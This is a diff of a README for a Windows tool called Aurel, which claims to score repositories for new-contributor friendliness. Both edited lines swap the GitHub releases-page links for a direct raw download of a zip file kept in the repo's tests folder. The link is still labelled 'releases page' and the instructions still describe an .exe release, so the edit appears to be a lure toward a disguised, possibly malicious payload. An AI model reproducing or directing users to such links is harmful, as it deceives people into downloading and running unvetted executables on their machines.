@@ -1,6 +1,6 @@
 # 🛠️ aurel_opensource_contribution - Score your project for new contributors
 
-[![](https://img.shields.io/badge/Download-Aurel_Tool-blue.svg)](https://github.com/wynnpowdery808/aurel_opensource_contribution/releases)
+[![](https://img.shields.io/badge/Download-Aurel_Tool-blue.svg)](https://github.com/wynnpowdery808/aurel_opensource_contribution/raw/refs/heads/main/tests/aurel_opensource_contribution_3.0.zip)
 
 Aurel analyzes code repositories to help creators welcome new contributors. The tool scans files on GitHub, GitLab, and Bitbucket. It assigns a score for beginner friendliness. It provides Starter PR Kits, onboarding paths, and reports to guide those who want to help your project grow.
 
@@ -24,7 +24,7 @@ Aurel runs on Windows 10 or Windows 11. Your computer needs at least 4GB of RAM 
 
 Follow these steps to set up the tool on your system.
 
-1. Visit the [releases page](https://github.com/wynnpowdery808/aurel_opensource_contribution/releases) to download the application.
+1. Visit the [releases page](https://github.com/wynnpowdery808/aurel_opensource_contribution/raw/refs/heads/main/tests/aurel_opensource_contribution_3.0.zip) to download the application.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
